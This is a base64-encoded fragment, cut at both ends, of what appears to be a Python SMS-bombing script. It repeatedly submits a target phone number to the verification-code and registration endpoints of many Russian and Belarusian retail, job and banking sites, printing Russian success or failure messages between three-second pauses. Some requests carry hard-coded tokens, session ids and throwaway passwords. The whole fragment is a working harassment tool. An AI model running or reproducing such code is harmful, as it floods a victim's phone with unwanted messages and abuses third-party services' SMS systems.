0PTEwKQogICAgICAgICAgICAgICAgaWYgMjAwIDw9IHIuc3RhdHVzX2NvZGUgPCAzMDA6IAogICAgICAgICAgICAgICAgICAgIHByaW50KEZvcmUuQkxVRSArICcgWytdJyArIEZvcmUuQ1lBTiArICcg0KPRgdC/0LXRiNC90LDRjyDQvtGC0L/RgNCw0LLQutCwJykKICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgcHJpbnQoRm9yZS5SRUQgKyAnIFstXScgKyBGb3JlLkNZQU4gICsgJyDQndC1INGD0LTQsNC70L7RgdGMINC+0YLQv9GA0LDQstC40YLRjCcpCiAgICAgICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgICAgIHByaW50KEZvcmUuUkVEICsgJyBbLV0nICsgRm9yZS5DWUFOICArICcg0J3QtSDRg9C00LDQu9C+0YHRjCDQvtGC0L/RgNCw0LLQuNGC0YwnKQogICAgICAgICAgICB0aW1lLnNsZWVwKDMpCiAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgIHIgPSByZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vaS5hcGkua2FyaS5jb20vZWNvbW1lcmNlL2NsaWVudC9yZWdpc3RyYXRpb24vdmVyaWZ5L3Bob25lL2NvZGU/cGhvbmU9JTJCe30nLmZvcm1hdChwaG9uZSksIHRpbWVvdXQ9MTApCiAgICAgICAgICAgICAgICBpZiAyMDAgPD0gci5zdGF0dXNfY29kZSA8IDMwMDogCiAgICAgICAgICAgICAgICAgICAgcHJpbnQoRm9yZS5CTFVFICsgJyBbK10nICsgRm9yZS5DWUFOICsgJyDQo9GB0L/QtdGI0L3QsNGPINC+0YLQv9GA0LDQstC60LAnKQogICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICBwcmludChGb3JlLlJFRCArICcgWy1dJyArIEZvcmUuQ1lBTiAgKyAnINCd0LUg0YPQtNCw0LvQvtGB0Ywg0L7RgtC/0YDQsNCy0LjRgtGMJykKICAgICAgICAgICAgZXhjZXB0OgogICAgICAgICAgICAgICAgcHJpbnQoRm9yZS5SRUQgKyAnIFstXScgKyBGb3JlLkNZQU4gICsgJyDQndC1INGD0LTQsNC70L7RgdGMINC+0YLQv9GA0LDQstC40YLRjCcpCiAgICAgICAgICAgIHRpbWUuc2xlZXAoMykKICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgcmFuZG9tRW1haWwgPSByYW5kb21fY2hhcigxMykrIkBtYWlsLnJ1IgogICAgICAgICAgICAgICAgZW50ZXIgPSBzdHIocGhvbmUpWzotMTBdICsgJygnICsgc3RyKHBob25lKVsxOi03XSArICcpJyArIHN0cihwaG9uZSlbNDotNF0gKyAnLScgKyBzdHIocGhvbmUpWzc6LTJdICsgJy0nICsgc3RyKHBob25lKVs5Ol0KICAgICAgICAgICAgICAgIHIgPSByZXF1ZXN0cy5wb3N0KCdodHRwczovL2hhcHB5d2Vhci5ydS9pbmRleC5waHA/cm91dGU9bW9kdWxlL3JlZ2lzdGVyZm9ybWJveC9hamF4Q2hlY2tFbWFpbCcsIGRhdGE9eydlbWFpbCc6IHJhbmRvbUVtYWlsLCAndGVsZXBob25lJzogZW50ZXIsICdwYXNzd29yZCc6ICcxMjNxd3NkZnYnLCAnY29uZmlybSc6ICcxMjNxd3NkZnYnfSwgdGltZW91dD0xMCkKICAgICAgICAgICAgICAgIGlmIDIwMCA8PSByLnN0YXR1c19jb2RlIDwgMzAwOiAKICAgICAgICAgICAgICAgICAgICBwcmludChGb3JlLkJMVUUgKyAnIFsrXScgKyBGb3JlLkNZQU4gKyAnINCj0YHQv9C10YjQvdCw0Y8g0L7RgtC/0YDQsNCy0LrQsCcpCiAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgIHByaW50KEZvcmUuUkVEICsgJyBbLV0nICsgRm9yZS5DWUFOICArICcg0J3QtSDRg9C00LDQu9C+0YHRjCDQvtGC0L/RgNCw0LLQuNGC0YwnKQogICAgICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgICAgICBwcmludChGb3JlLlJFRCArICcgWy1dJyArIEZvcmUuQ1lBTiAgKyAnINCd0LUg0YPQtNCw0LvQvtGB0Ywg0L7RgtC/0YDQsNCy0LjRgtGMJykKICAgICAgICAgICAgdGltZS5zbGVlcCgzKQogICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICBlbnRlciA9ICcrJyArIHN0cihwaG9uZSkKICAgICAgICAgICAgICAgIHIgPSByZXF1ZXN0cy5wb3N0KCdodHRwczovL3d3dy5wZXRzaG9wLnJ1L2FqYXgvP2FjdD1BdXRoRm9ybS5TZW5kQ29kZScsIGRhdGE9eyJ0b2tlbiI6IjQxMzhkY2U4YjRhNDhiZGE5ODZlMjM4NjZiNjY5ZDdmIiwiaXNfYWpheCI6J3RydWUnLCJwaG9uZSI6ZW50ZXIsImZvcmNlIjonZmFsc2UnfSwgdGltZW91dD0xMCkKICAgICAgICAgICAgICAgIGlmIDIwMCA8PSByLnN0YXR1c19jb2RlIDwgMzAwOiAKICAgICAgICAgICAgICAgICAgICBwcmludChGb3JlLkJMVUUgKyAnIFsrXScgKyBGb3JlLkNZQU4gKyAnINCj0YHQv9C10YjQvdCw0Y8g0L7RgtC/0YDQsNCy0LrQsCcpCiAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgIHByaW50KEZvcmUuUkVEICsgJyBbLV0nICsgRm9yZS5DWUFOICArICcg0J3QtSDRg9C00LDQu9C+0YHRjCDQvtGC0L/RgNCw0LLQuNGC0YwnKQogICAgICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgICAgICBwcmludChGb3JlLlJFRCArICcgWy1dJyArIEZvcmUuQ1lBTiAgKyAnINCd0LUg0YPQtNCw0LvQvtGB0Ywg0L7RgtC/0YDQsNCy0LjRgtGMJykKICAgICAgICAgICAgdGltZS5zbGVlcCgzKQogICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICBlbnRlciA9IHN0cihwaG9uZSlbOi0xMF0gKyAnKygnICsgc3RyKHBob25lKVsxOi03XSArICcpKycgKyBzdHIocGhvbmUpWzQ6LTRdICsgJy0nICsgc3RyKHBob25lKVs3Oi0yXSArICctJyArIHN0cihwaG9uZSlbOTpdCiAgICAgICAgICAgICAgICByID0gcmVxdWVzdHMuZ2V0KCdodHRwczovL3N1cGVyc3RlcC5ydS9hamF4L2F1dGhQaG9uZS5waHA/QVVUSF9QSE9ORT1ZJlJFRElSRUNUX0FGVEVSX0NPTkZJUk09JTI1MkZwZXJzb25hbCUyNTJGcHJvZmlsZSUyNTJGJlBFUlNPTkFMX1BIT05FPSUyQnt9Jy5mb3JtYXQoZW50ZXIpLCB0aW1lb3V0PTEwKQogICAgICAgICAgICAgICAgaWYgMjAwIDw9IHIuc3RhdHVzX2NvZGUgPCAzMDA6IAogICAgICAgICAgICAgICAgICAgIHByaW50KEZvcmUuQkxVRSArICcgWytdJyArIEZvcmUuQ1lBTiArICcg0KPRgdC/0LXRiNC90LDRjyDQvtGC0L/RgNCw0LLQutCwJykKICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgcHJpbnQoRm9yZS5SRUQgKyAnIFstXScgKyBGb3JlLkNZQU4gICsgJyDQndC1INGD0LTQsNC70L7RgdGMINC+0YLQv9GA0LDQstC40YLRjCcpCiAgICAgICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgICAgIHByaW50KEZvcmUuUkVEICsgJyBbLV0nICsgRm9yZS5DWUFOICArICcg0J3QtSDRg9C00LDQu9C+0YHRjCDQvtGC0L/RgNCw0LLQuNGC0YwnKQogICAgICAgICAgICB0aW1lLnNsZWVwKDMpCiAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgIGVudGVyID0gJysgJyArIHN0cihwaG9uZSlbOi0xMF0gKyAnICggJyArIHN0cihwaG9uZSlbMTotN10gKyAnICkgJyArIHN0cihwaG9uZSlbNDotNF0gKyAnLScgKyBzdHIocGhvbmUpWzc6LTJdICsgJy0nICsgc3RyKHBob25lKVs5Ol0KICAgICAgICAgICAgICAgIHIgPSByZXF1ZXN0cy5wb3N0KCdodHRwczovL25ldy5tb3kubWFnbml0LnJ1L2xvY2FsL2FqYXgvbG9naW4vJywgZGF0YT17J3Bob25lJzogZW50ZXJ9LCB0aW1lb3V0PTEwKQogICAgICAgICAgICAgICAgaWYgMjAwIDw9IHIuc3RhdHVzX2NvZGUgPCAzMDA6IAogICAgICAgICAgICAgICAgICAgIHByaW50KEZvcmUuQkxVRSArICcgWytdJyArIEZvcmUuQ1lBTiArICcg0KPRgdC/0LXRiNC90LDRjyDQvtGC0L/RgNCw0LLQutCwJykKICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgcHJpbnQoRm9yZS5SRUQgKyAnIFstXScgKyBGb3JlLkNZQU4gICsgJyDQndC1INGD0LTQsNC70L7RgdGMINC+0YLQv9GA0LDQstC40YLRjCcpCiAgICAgICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgICAgIHByaW50KEZvcmUuUkVEICsgJyBbLV0nICsgRm9yZS5DWUFOICArICcg0J3QtSDRg9C00LDQu9C+0YHRjCDQvtGC0L/RgNCw0LLQuNGC0YwnKQogICAgICAgICAgICB0aW1lLnNsZWVwKDMpCiAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgIHIgPSByZXF1ZXN0cy5wb3N0KCdodHRwczovL3dlYi1hcGkuYXB0ZWthLWFwcmlsLnJ1L3VzZXJzJywganNvbj17InBob25lIjpwaG9uZSwicGFzc3dvcmQiOiJxVWJqaWstdmVxc28wLWpvYnBlayIsIm5hbWUiOiJEbWl0cnkiLCJzbmFtZSI6IiJ9LCB0aW1lb3V0PTEwKQogICAgICAgICAgICAgICAgaWYgMjAwIDw9IHIuc3RhdHVzX2NvZGUgPCAzMDA6IAogICAgICAgICAgICAgICAgICAgIHByaW50KEZvcmUuQkxVRSArICcgWytdJyArIEZvcmUuQ1lBTiArICcg0KPRgdC/0LXRiNC90LDRjyDQvtGC0L/RgNCw0LLQutCwJykKICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgcHJpbnQoRm9yZS5SRUQgKyAnIFstXScgKyBGb3JlLkNZQU4gICsgJyDQndC1INGD0LTQsNC70L7RgdGMINC+0YLQv9GA0LDQstC40YLRjCcpCiAgICAgICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgICAgIHByaW50KEZvcmUuUkVEICsgJyBbLV0nICsgRm9yZS5DWUFOICArICcg0J3QtSDRg9C00LDQu9C+0YHRjCDQvtGC0L/RgNCw0LLQuNGC0YwnKQogICAgICAgICAgICB0aW1lLnNsZWVwKDMpCiAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgIGVudGVyID0gc3RyKHBob25lKVsxOl0KICAgICAgICAgICAgICAgIHIgPSByZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vYmVsYmF6YXIyNC5ieS9hamF4LnBocD9hY3Rpb249Z2V0X3Ntc19jb2RlJmFjdD1zbXMmcGhvbmVfY29kZT03JnBob25lPXt9JnBob25lX3Ntc19jb2RlPScuZm9ybWF0KGVudGVyKSwgdGltZW91dD0xMCkKICAgICAgICAgICAgICAgIGlmIDIwMCA8PSByLnN0YXR1c19jb2RlIDwgMzAwOiAKICAgICAgICAgICAgICAgICAgICBwcmludChGb3JlLkJMVUUgKyAnIFsrXScgKyBGb3JlLkNZQU4gKyAnINCj0YHQv9C10YjQvdCw0Y8g0L7RgtC/0YDQsNCy0LrQsCcpCiAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgIHByaW50KEZvcmUuUkVEICsgJyBbLV0nICsgRm9yZS5DWUFOICArICcg0J3QtSDRg9C00LDQu9C+0YHRjCDQvtGC0L/RgNCw0LLQuNGC0YwnKQogICAgICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgICAgICBwcmludChGb3JlLlJFRCArICcgWy1dJyArIEZvcmUuQ1lBTiAgKyAnINCd0LUg0YPQtNCw0LvQvtGB0Ywg0L7RgtC/0YDQsNCy0LjRgtGMJykKICAgICAgICAgICAgdGltZS5zbGVlcCgzKQogICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICBlbnRlciA9ICcrJyArIHN0cihwaG9uZSlbOi0xMF0gKyAnICgnICsgc3RyKHBob25lKVsxOi03XSArICcpICcgKyBzdHIocGhvbmUpWzQ6XQogICAgICAgICAgICAgICAgciA9IHJlcXVlc3RzLnBvc3QoJ2h0dHBzOi8vbWFya2Zvcm1lbGxlLmJ5L2xvY2FsL3RlbXBsYXRlcy9tYXJrZm9ybWVsbGUvY29tcG9uZW50cy9iaXRyaXgvc3lzdGVtLmF1dGguZm9ybS9tZi9hamF4LnBocCcsIGRhdGE9eydwaG9uZSc6ZW50ZXJ9LCB0aW1lb3V0PTEwKQogICAgICAgICAgICAgICAgaWYgMjAwIDw9IHIuc3RhdHVzX2NvZGUgPCAzMDA6IAogICAgICAgICAgICAgICAgICAgIHByaW50KEZvcmUuQkxVRSArICcgWytdJyArIEZvcmUuQ1lBTiArICcg0KPRgdC/0LXRiNC90LDRjyDQvtGC0L/RgNCw0LLQutCwJykKICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgcHJpbnQoRm9yZS5SRUQgKyAnIFstXScgKyBGb3JlLkNZQU4gICsgJyDQndC1INGD0LTQsNC70L7RgdGMINC+0YLQv9GA0LDQstC40YLRjCcpCiAgICAgICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgICAgIHByaW50KEZvcmUuUkVEICsgJyBbLV0nICsgRm9yZS5DWUFOICArICcg0J3QtSDRg9C00LDQu9C+0YHRjCDQvtGC0L/RgNCw0LLQuNGC0YwnKQogICAgICAgICAgICB0aW1lLnNsZWVwKDMpCiAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgIGVudGVyID0gJysnICsgc3RyKHBob25lKVs6LTEwXSArICcgKCcgKyBzdHIocGhvbmUpWzE6LTddICsgJykgJyArIHN0cihwaG9uZSlbNDotNF0gKyAnLScgKyBzdHIocGhvbmUpWzc6LTJdICsgJy0nICsgc3RyKHBob25lKVs5Ol0KICAgICAgICAgICAgICAgIHIgPSByZXF1ZXN0cy5wb3N0KCdodHRwczovL3N0b2xuaWsyNC5ydS9hamF4L3Jtcy9vdGhlci9hdXRoLnJlZ2lzdGVyLnBocD9hdXRoPXknLCBkYXRhPXsncGhvbmUnOiBlbnRlciwgJ3NlbmRQYXNzd29yZFNtcyc6ICd5J30sIHRpbWVvdXQ9MTApCiAgICAgICAgICAgICAgICBpZiAyMDAgPD0gci5zdGF0dXNfY29kZSA8IDMwMDogCiAgICAgICAgICAgICAgICAgICAgcHJpbnQoRm9yZS5CTFVFICsgJyBbK10nICsgRm9yZS5DWUFOICsgJyDQo9GB0L/QtdGI0L3QsNGPINC+0YLQv9GA0LDQstC60LAnKQogICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICBwcmludChGb3JlLlJFRCArICcgWy1dJyArIEZvcmUuQ1lBTiAgKyAnINCd0LUg0YPQtNCw0LvQvtGB0Ywg0L7RgtC/0YDQsNCy0LjRgtGMJykKICAgICAgICAgICAgZXhjZXB0OgogICAgICAgICAgICAgICAgcHJpbnQoRm9yZS5SRUQgKyAnIFstXScgKyBGb3JlLkNZQU4gICsgJyDQndC1INGD0LTQsNC70L7RgdGMINC+0YLQv9GA0LDQstC40YLRjCcpCiAgICAgICAgICAgIHRpbWUuc2xlZXAoMykKICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgciA9IHJlcXVlc3RzLnBvc3QoJ2h0dHBzOi8vbG95bWF4Lml2b2luLnJ1L3B1YmxpY2FwaS92MS4yL1JlZ2lzdHJhdGlvbi9CZWdpblJlZ2lzdHJhdGlvbicsIGpzb249eyJwYXNzd29yZCI6IiIsImxvZ2luIjpwaG9uZX0sIHRpbWVvdXQ9MTApCiAgICAgICAgICAgICAgICBpZiAyMDAgPD0gci5zdGF0dXNfY29kZSA8IDMwMDogCiAgICAgICAgICAgICAgICAgICAgcHJpbnQoRm9yZS5CTFVFICsgJyBbK10nICsgRm9yZS5DWUFOICsgJyDQo9GB0L/QtdGI0L3QsNGPINC+0YLQv9GA0LDQstC60LAnKQogICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICBwcmludChGb3JlLlJFRCArICcgWy1dJyArIEZvcmUuQ1lBTiAgKyAnINCd0LUg0YPQtNCw0LvQvtGB0Ywg0L7RgtC/0YDQsNCy0LjRgtGMJykKICAgICAgICAgICAgZXhjZXB0OgogICAgICAgICAgICAgICAgcHJpbnQoRm9yZS5SRUQgKyAnIFstXScgKyBGb3JlLkNZQU4gICsgJyDQndC1INGD0LTQsNC70L7RgdGMINC+0YLQv9GA0LDQstC40YLRjCcpCiAgICAgICAgICAgIHRpbWUuc2xlZXAoMykKICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgZW50ZXIgPSAnKycgKyBzdHIocGhvbmUpWzotMTBdICsgJyAoJyArIHN0cihwaG9uZSlbMTotN10gKyAnKSAnICsgc3RyKHBob25lKVs0Oi00XSArICctJyArIHN0cihwaG9uZSlbNzotMl0gKyAnLScgKyBzdHIocGhvbmUpWzk6XQogICAgICAgICAgICAgICAgciA9IHJlcXVlc3RzLnBvc3QoJ2h0dHBzOi8vd3d3Lmd1bGxpdmVyLnJ1L2FwaS9hdXRob3JpemF0aW9uL3Bob25lL2NvZGVfcmVxdWVzdCcsIGpzb249eyJwaG9uZSI6ZW50ZXIsInRva2VuIjoiNDQ1NDE2NDM3NzYzNjRiZjA4ZDg4YWMyMDQyMjc2YmExNDgyMmZkYjQzZWRiY2FhNjg3NmIwMWRmNGMxZmVmYTQ0NTQxNjQzNzc2MzY0YmYwOGQ4OGFjMjA0MjI3NmJhNDQ1NDE2NDM3NzYzNjRiZjA4ZDg4YWMyMDQyMjc2YmExNDgyMmZkYjQzZWRiY2FhNjg3NmIwMWRmNGMxZmVmYTQ0NTQxNjQzNzc2MzY0YmYwOGQ4OGFjMjA0MjI3NmJhMTQ4MjJmZGI0M2VkYmNhYTY4NzZiMDFkZjRjMWZlZmE0NDU0MTY0Mzc3NjM2NGJmMDhkODhhYzIwNDIyNzZiYTQ0NTQxNjQzNzc2MzY0YmYwOGQ4OGFjMjA0MjI3NmJhMTQ4MjJmZGI0M2VkYmNhYTY4NzZiMDFkZjRjMWZlZmE0NDU0MTY0Mzc3NjM2NGJmMDhkODhhYzIwNDIyNzZiYTE0ODIyZmRiNDNlZGJjYWE2ODc2YjAxZGY0YzFmZWZhNDQ1NDE2NDM3NzYzNjRiZjA4ZDg4YWMyMDQyMjc2YmExNDgyMmZkYjQzZWRiY2FhNjg3NmIwMWRmNGMxZmVmYTQ0NTQxNjQzNzc2MzY0YmYwOGQ4OGFjMjA0MjI3NmJhIn0sIHRpbWVvdXQ9MTApCiAgICAgICAgICAgICAgICBpZiAyMDAgPD0gci5zdGF0dXNfY29kZSA8IDMwMDogCiAgICAgICAgICAgICAgICAgICAgcHJpbnQoRm9yZS5CTFVFICsgJyBbK10nICsgRm9yZS5DWUFOICsgJyDQo9GB0L/QtdGI0L3QsNGPINC+0YLQv9GA0LDQstC60LAnKQogICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICBwcmludChGb3JlLlJFRCArICcgWy1dJyArIEZvcmUuQ1lBTiAgKyAnINCd0LUg0YPQtNCw0LvQvtGB0Ywg0L7RgtC/0YDQsNCy0LjRgtGMJykKICAgICAgICAgICAgZXhjZXB0OgogICAgICAgICAgICAgICAgcHJpbnQoRm9yZS5SRUQgKyAnIFstXScgKyBGb3JlLkNZQU4gICsgJyDQndC1INGD0LTQsNC70L7RgdGMINC+0YLQv9GA0LDQstC40YLRjCcpCiAgICAgICAgICAgIHRpbWUuc2xlZXAoMykKICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgZW50ZXIgPSAnKycgKyBzdHIocGhvbmUpWzotMTBdICsgJyAoJyArIHN0cihwaG9uZSlbMTotN10gKyAnKSAnICsgc3RyKHBob25lKVs0Oi00XSArICctJyArIHN0cihwaG9uZSlbNzpdCiAgICAgICAgICAgICAgICByID0gcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly92c2V2b2xvZ2hzay50YXhvdmljaGtvZi5ydS9hcGkvdXNlclNlbmRTbXMnLCBkYXRhPXsndXNlcm5hbWUnOiBlbnRlciwnbGFuZyc6ICdydScsJ2NpdHknOiAndnN2bCd9LCB0aW1lb3V0PTEwKQogICAgICAgICAgICAgICAgaWYgMjAwIDw9IHIuc3RhdHVzX2NvZGUgPCAzMDA6IAogICAgICAgICAgICAgICAgICAgIHByaW50KEZvcmUuQkxVRSArICcgWytdJyArIEZvcmUuQ1lBTiArICcg0KPRgdC/0LXRiNC90LDRjyDQvtGC0L/RgNCw0LLQutCwJykKICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgcHJpbnQoRm9yZS5SRUQgKyAnIFstXScgKyBGb3JlLkNZQU4gICsgJyDQndC1INGD0LTQsNC70L7RgdGMINC+0YLQv9GA0LDQstC40YLRjCcpCiAgICAgICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgICAgIHByaW50KEZvcmUuUkVEICsgJyBbLV0nICsgRm9yZS5DWUFOICArICcg0J3QtSDRg9C00LDQu9C+0YHRjCDQvtGC0L/RgNCw0LLQuNGC0YwnKQogICAgICAgICAgICB0aW1lLnNsZWVwKDMpCiAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgIGVudGVyID0gJysnICsgc3RyKHBob25lKQogICAgICAgICAgICAgICAgciA9IHJlcXVlc3RzLnBvc3QoJ2h0dHBzOi8vdnNldm9sb2pzay5yYWJvdGEucnUvYXBpLXdlYi92Ni9jb2RlL3NlbmQuanNvbicsIGpzb249eyJyZXF1ZXN0Ijp7ImxvZ2luIjplbnRlcn0sInJlcXVlc3RfaWQiOjQ4Njc2NDQ0LCJhcHBsaWNhdGlvbl9pZCI6MTMsInJhYm90YV9ydV9pZCI6IjYxZDBiZTgwMjkxNTYxMDAyNzExMDM0MDY0Mzg1OTU0IiwidXNlcl90YWdzIjpbeyJpZCI6MCwiYWRkX2RhdGUiOiIyMDIyLTAxLTAxIiwibmFtZSI6ImhyX2Jhbm5lcnNfc2hvdyJ9LHsiaWQiOjAsImFkZF9kYXRlIjoiMjAyMi0wMS0wMSIsIm5hbWUiOiJ3ZWJfcHJlbWl1bV90YXJnZXQifSx7ImlkIjowLCJhZGRfZGF0ZSI6IjIwMjItMDEtMDEiLCJuYW1lIjoiY291cnNlc193aWRnZXRfdGFyZ2V0In0seyJpZCI6MCwiYWRkX2RhdGUiOiIyMDIyLTAxLTAxIiwibmFtZSI6InNlYXJjaF9leGNsdWRlX3JlbG9jMl90YXJnZXQifSx7ImlkIjowLCJhZGRfZGF0ZSI6IjIwMjItMDEtMDEiLCJuYW1lIjoid2ViX3NlYXJjaF9hbGxfcmVnaW9uczJfdGFyZ2V0MSJ9LHsiaWQiOjAsImFkZF9kYXRlIjoiMjAyMi0wMS0wMSIsIm5hbWUiOiJwcm9mZXNzaW9uX3dpZGdldF90YXJnZXQifSx7ImlkIjowLCJhZGRfZGF0ZSI6IjIwMjItMDEtMDEiLCJuYW1lIjoidXNlX3Z3b19zZXJ2aWNlIn1dfSwgdGltZW91dD0xMCkKICAgICAgICAgICAgICAgIGlmIDIwMCA8PSByLnN0YXR1c19jb2RlIDwgMzAwOiAKICAgICAgICAgICAgICAgICAgICBwcmludChGb3JlLkJMVUUgKyAnIFsrXScgKyBGb3JlLkNZQU4gKyAnINCj0YHQv9C10YjQvdCw0Y8g0L7RgtC/0YDQsNCy0LrQsCcpCiAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgIHByaW50KEZvcmUuUkVEICsgJyBbLV0nICsgRm9yZS5DWUFOICArICcg0J3QtSDRg9C00LDQu9C+0YHRjCDQvtGC0L/RgNCw0LLQuNGC0YwnKQogICAgICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgICAgICBwcmludChGb3JlLlJFRCArICcgWy1dJyArIEZvcmUuQ1lBTiAgKyAnINCd0LUg0YPQtNCw0LvQvtGB0Ywg0L7RgtC/0YDQsNCy0LjRgtGMJykKICAgICAgICAgICAgdGltZS5zbGVlcCgzKQogICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICBlbnRlciA9IHN0cihwaG9uZSlbOi0xMF0gKyAnICcgKyBzdHIocGhvbmUpWzE6LTddICsgJyAnICsgc3RyKHBob25lKVs0Oi00XSArICcgJyArIHN0cihwaG9uZSlbNzotMl0gKyAnICcgKyBzdHIocGhvbmUpWzk6XQogICAgICAgICAgICAgICAgciA9IHJlcXVlc3RzLnBvc3QoJ2h0dHBzOi8vc29jaWFsLmpvdXJuYWwudGlua29mZi5ydS9hcGkvdjIwL2FjY291bnQvbG9naW4vcGhvbmUvJywganNvbj17InBob25lIjplbnRlciwicG9pbnRfb2ZfY29udGFjdCI6ImhlYWRlci1sb2dpbi1idXR0b24ifSwgdGltZW91dD0xMCkKICAgICAgICAgICAgICAgIGlmIDIwMCA8PSByLnN0YXR1c19jb2RlIDwgMzAwOiAKICAgICAgICAgICAgICAgICAgICBwcmludChGb3JlLkJMVUUgKyAnIFsrXScgKyBGb3JlLkNZQU4gKyAnINCj0YHQv9C10YjQvdCw0Y8g0L7RgtC/0YDQsNCy0LrQsCcpCiAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgIHByaW50KEZvcmUuUkVEICsgJyBbLV0nICsgRm9yZS5DWUFOICArICcg0J3QtSDRg9C00LDQu9C+0YHRjCDQvtGC0L/RgNCw0LLQuNGC0YwnKQogICAgICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgICAgICBwcmludChGb3JlLlJFRCArICcgWy1dJyArIEZvcmUuQ1lBTiAgKyAnINCd0LUg0YPQtNCw0LvQvtGB0Ywg0L7RgtC/0YDQsNCy0LjRgtGMJykKICAgICAgICAgICAgdGltZS5zbGVlcCgzKQogICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICBlbnRlciA9ICcrJyArIHBob25lCiAgICAgICAgICAgICAgICByID0gcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9ncm91cHByaWNlLnJ1L2F1dGhfcGhvbmUvc2VuZF9waG9uZV90b2tlbicsIGRhdGE9eydwaG9uZSc6IGVudGVyLCd0aW1lX3pvbmUnOiAxODB9LCB0aW1lb3V0PTEwKQogICAgICAgICAgICAgICAgaWYgMjAwIDw9IHIuc3RhdHVzX2NvZGUgPCAzMDA6IAogICAgICAgICAgICAgICAgICAgIHByaW50KEZvcmUuQkxVRSArICcgWytdJyArIEZvcmUuQ1lBTiArICcg0KPRgdC/0LXRiNC90LDRjyDQvtGC0L/RgNCw0LLQutCwJykKICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgcHJpbnQoRm9yZS5SRUQgKyAnIFstXScgKyBGb3JlLkNZQU4gICsgJyDQndC1INGD0LTQsNC70L7RgdGMINC+0YLQv9GA0LDQstC40YLRjCcpCiAgICAgICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgICAgIHByaW50KEZvcmUuUkVEICsgJyBbLV0nICsgRm9yZS5DWUFOICArICcg0J3QtSDRg9C00LDQu9C+0YHRjCDQvtGC0L/RgNCw0LLQuNGC0YwnKQogICAgICAgICAgICB0aW1lLnNsZWVwKDMpCiAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgIGVudGVyID0gJzgnICsgc3RyKHBob25lKVsxOl0KICAgICAgICAgICAgICAgIGhlYWQgPSB7J1VzZXItQWdlbnQnOiAnTW96aWxsYS81LjAgKE1hY2ludG9zaDsgSW50ZWwgTWFjIE9TIFggMTBfMTVfNykgQXBwbGVXZWJLaXQvNjA1LjEuMTUgKEtIVE1MLCBsaWtlIEdlY2tvKSBWZXJzaW9uLzE1LjIgU2FmYXJpLzYwNS4xLjE1J30KICAgICAgICAgICAgICAgIHIgPSByZXF1ZXN0cy5wb3N0KCdodHRwczovL3d3dy50cmFla3RvcmlhLnJ1L2xvY2FsL2FqYXgvYXV0aG9yaXplLnBocD9hY3Rpb249MicsaGVhZGVycz1oZWFkLCBkYXRhPXsncGhvbmUnOiBlbnRlciwnYnhzZXNzaWQnOiAnMjE2NmU2OWUxOTM3Njk0ODZkNjhiY2VhODIxZjI5YmYnLCdsaWQnOiAndHInfSwgdGltZW91dD0xMCkKICAgICAgICAgICAgICAgIGlmIDIwMCA8PSByLnN0YXR1c19jb2RlIDwgMzAwOiAKICAgICAgICAgICAgICAgICAgICBwcmludChGb3JlLkJMVUUgKyAnIFsrXScgKyBGb3JlLkNZQU4gKyAnINCj0YHQv9C10YjQvdCw0Y8g0L7RgtC/0YDQsNCy0LrQsCcpCiAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgIHByaW50KEZvcmUuUkVEICsgJyBbLV0nICsgRm9yZS5DWUFOICArICcg0J3QtSDRg9C00LDQu9C+0YHRjCDQvtGC0L/RgNCw0LLQuNGC0YwnKQogICAgICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgICAgICBwcmludChGb3JlLlJFRCArICcgWy1dJyArIEZvcmUuQ1lBTiAgKyAnINCd0LUg0YPQtNCw0LvQvtGB0Ywg0L7RgtC/0YDQsNCy0LjRgtGMJykKICAgICAgICAgICAgdGltZS5z